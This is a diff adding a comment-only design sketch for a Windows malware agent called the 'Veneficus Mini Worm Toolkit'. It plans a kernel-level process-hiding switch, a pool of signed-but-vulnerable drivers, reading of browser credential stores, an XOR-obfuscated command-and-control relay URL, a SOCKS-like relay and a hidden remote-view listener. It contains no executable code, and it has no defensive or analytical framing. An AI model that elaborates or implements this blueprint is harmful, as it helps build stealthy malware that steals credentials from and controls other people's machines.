@@ -1,0 +1,40 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# Veneficus Mini — project sketch (not a real manifest)
+#
+# Language: systems language with a Windows target
+# Edition: current stable
+# Output: single agent binary for 64-bit Windows
+#
+# FEATURES (compile-time switches)
+#   default  = driver_assist + kernel_hide
+#   driver_assist  — include the signed-driver helper pool
+#   kernel_hide    — include the process-hide attempt
+#
+# RELEASE PROFILE (intent, not flags)
+#   strip symbols
+#   link-time optimization
+#   abort on panic
+#   size-oriented optimization
+#
+# DEPENDENCY CLASSES (no crate names)
+#   Windows API bindings
+#   async runtime
+#   HTTPS client with a non-OpenSSL TLS stack
+#   JSON
+#   authenticated encryption + HMAC
+#   host inventory
+#   embedded SQL reader (browser stores)
+#   registry helper
+#   optional: stack-cover helper, native-call helper
+#
+# BUILD INPUTS (environment, names are aliases)
+#   CHANNEL_HOST_BYTES   — XOR-obfuscated relay base URL
+#   DRIVER_POOL_DIR      — directory of signed-but-vulnerable .sys files
+#   HELPER_DIR           — optional fallback tools
+#   LOCAL_RELAY_BIND     — SOCKS-like bind address
+#   VIEW_PORT            — hidden-view listener port
